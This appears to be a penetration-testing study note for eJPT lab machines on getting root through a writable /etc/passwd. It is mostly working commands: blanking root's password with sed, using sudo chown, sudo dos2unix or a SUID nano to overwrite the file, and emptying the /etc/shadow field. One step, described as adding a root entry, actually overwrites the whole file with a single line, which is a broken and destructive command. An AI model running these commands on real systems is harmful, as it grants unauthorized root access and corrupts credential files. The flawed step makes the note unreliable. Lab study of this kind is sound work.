---
type: technique
tags: [ejpt:host-net-pentest]
tools: []
cves: []
related: [[sudo-abuse]]
---

# Writable /etc/passwd

When `/etc/passwd` is writable by you (or you can *make* it writable), you can add or blank a root entry and switch user.

## Check

```sh
ls -l /etc/passwd
# -rw-rw-r-- 1 root pinguinos ... → group-writable
```

It may also already be writable for other reasons — or you can force it with `sudo chown` (see below).

## Exploit

Two equivalent moves: add a fresh root entry, or blank the existing `root` entry.

1. **Add a root entry** with an empty password field:
   ```sh
   echo 'root::0:0:root:/root:/bin/sh' > /etc/passwd
   ```
2. **Blank existing root's password** (preserves the rest of the line):
   ```sh
   sed 's/root:x:/root::/' /etc/passwd > /tmp/passwd.new
   cat /tmp/passwd.new > /etc/passwd
   ```
3. `su -` to root (no password required).

## Making it writable via `sudo chown`

If `sudo -l` grants you `chown` (as root), you can *create* the writable condition:

```sh
sudo -u root /usr/bin/chown $(id -u):$(id -g) /etc/passwd
chmod 777 /etc/passwd
```

Owning the file also lets you `chmod` it. This is the [[anonymous-pingu]] route ([[sudo-abuse]]).

## Overwriting via `sudo dos2unix`

If `sudo -l` grants `dos2unix` as root, its `-f -n` (force + output-to-file) can overwrite `/etc/passwd` with a blank-root copy:

```sh
sed 's/root:x:/root::/' /etc/passwd > /tmp/passwd.new
sudo -u root dos2unix -f -n /tmp/passwd.new /etc/passwd
su -
```

This is the [[bruteshock]] route — `dos2unix` is a GTFOBins "file overwrite" primitive ([[gtfobins]]).

## Editing directly via a SUID editor

If `find / -perm -4000` turns up an editor (`nano`, `vim`), it *is* the write primitive — open the file and blank the field yourself:

```sh
/usr/bin/nano /etc/passwd    # root:x: → root::
su -
```

This is the [[domain]] route ([[suid-enumeration]]). No `sed`, no `chmod` — the SUID bit already gives you root's write access.

## Notes

- Modern systems store hashes in `/etc/shadow`, but an empty password field still bypasses auth on many setups. The same empty-field trick works in `/etc/shadow` (blank the second field).
- Preserve the original file content when possible.

## Seen in

[[adopting]], [[anonymous-pingu]], [[bruteshock]], [[domain]]
